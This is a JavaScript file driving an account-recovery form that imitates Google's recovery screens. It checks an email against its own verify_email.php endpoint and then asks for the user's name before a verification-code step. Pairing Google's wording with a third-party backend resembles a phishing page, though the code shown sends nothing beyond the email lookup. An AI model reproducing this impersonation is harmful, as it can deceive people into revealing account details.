
if (document.querySelectorAll('.group-i') && document.getElementById('recover-button-email') &&
    document.getElementById('recover-button-name')) {
    document.getElementById('recover-button-email').addEventListener('click', () => {
        verifyInputRecoverEmail();
    });

    document.getElementById('recover-button-name').addEventListener('click', () => {
        verifyInputRecoverName();
    });


    let emailRecover = document.getElementById('recover-email');
    let nameRecover = document.getElementById('recover-name');
    let envEmail = document.querySelector('.env-email-recover');
    function verifyInputRecoverEmail() {
        let count = 0;
        document.querySelectorAll('.group-i input').forEach(item => {
            let id = item.id;
            if (id) {
                if (item.name === "recover-email") {
                    if (!item.value) {
                        document.getElementById('error-' + id).classList.add('alert-error-fieldeset');
                        document.getElementById('msg-' + id).style.display = "flex";
                    } else {
                        document.getElementById('error-' + id).classList.remove('alert-error-fieldeset');
                        document.getElementById('msg-' + id).style.display = "none";
                        count++;
                    }
                }
            }
            if (validateRecoverEmail(item.value) === true) {
                verifyRecoverEmail(item.value).then(user => {
                    if (user === '1') {
                        if (count === 1) {
                            emailRecover.style.display = "none";
                            nameRecover.style.display = "flex";
                            let h2 = 'What’s your name?';
                            let p = 'Enter the name on your Google Account';
                            title(h2, p);
                        }
                    } else {
                        document.getElementById('error-11').classList.add('alert-error-fieldeset');
                        document.getElementById('msg-11').style.display = "flex";
                        document.getElementById('msg-11').innerHTML = "E-mail não encontrado";
                    }
                });
            }
        });



    }

    function verifyInputRecoverName() {
        let count = 0;
        document.querySelectorAll('.name-i-x input').forEach(item => {
            let id = item.id;
            if (id) {
                if (!item.value) {
                    document.getElementById('error-' + id).classList.add('alert-error-fieldeset');
                    document.getElementById('msg-' + id).style.display = "flex";
                } else {
                    document.getElementById('error-' + id).classList.remove('alert-error-fieldeset');
                    document.getElementById('msg-' + id).style.display = "none";
                    count++;
                }
            }
        });

        if (count === 2) {
            nameRecover.style.display = 'none';
            envEmail.style.display = 'flex';
            let h2 = 'Get a verification code';
            let p = 'To help keep your account safe, Google wants to make sure it’s really you trying to sign in';
            title(h2, p);
        }
    }

    function validateRecoverEmail(email) {
        var re = /\S+@\S+\.\S+/;
        return re.test(email);
    }

    async function verifyRecoverEmail(email) {

        const req = await fetch(`${base}/verify_email.php?email=${email}`, {
            method: 'GET'
        });
        const json = await req.json();
        if (json == false) {
            return '0';
        } else {
            return '1';
        }

    }
    function title(h1, p) {
        document.querySelectorAll('.group-title').forEach(item => {
            item.querySelector('h2').innerHTML = h1;
            item.querySelector('p').innerHTML = p;
        });
    }
}